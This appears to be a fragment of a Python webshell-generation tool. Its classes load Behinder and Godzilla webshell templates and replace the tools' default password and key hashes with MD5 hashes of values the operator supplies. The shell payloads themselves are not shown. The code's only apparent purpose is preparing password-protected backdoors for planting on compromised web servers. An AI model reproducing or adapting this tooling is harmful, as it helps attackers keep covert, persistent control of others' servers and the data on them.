...
class Webshell:
    def __init__(self, path, type, tool, mode, _pass, _key) -> None:
        self.path = path
        self.type = type
        self.tool = tool
        self.mode = mode
...
class BehinderWebshell(Webshell):
    def __init__(self, path, type, tool, mode, _pass):
        Webshell.__init__(self, path, type, tool, mode, _pass, _key=None)
        self.set_shell_raw_content(path)
        self.set_shell_pass(_pass)
        self.set_shell_content()

    def set_shell_pass(self, _pass):
        __passwd_md5 = self.md5(_pass)
        self.raw_content = self.raw_content.replace("e45e329feb5d925b", __passwd_md5)  # rebeyond


class GodzillaWebshell(Webshell):
    def __init__(self, path, type, tool, mode, _pass, _key):
        Webshell.__init__(self, path, type, tool, mode, _pass, _key)
        self.set_shell_raw_content(path)
        self.set_shell_pass(_pass, _key)
        self.set_shell_content()

    def set_shell_pass(self, _pass, _key):
        __key_md5 = self.md5(_key)
        self.raw_content = self.raw_content.replace("\"pass\"", f"\"{_pass}\"")  # pass
        self.raw_content = self.raw_content.replace("'pass'", f"\"{_pass}\"")  # pass
        self.raw_content = self.raw_content.replace("3c6e0b8a9c15224a", __key_md5)  # key
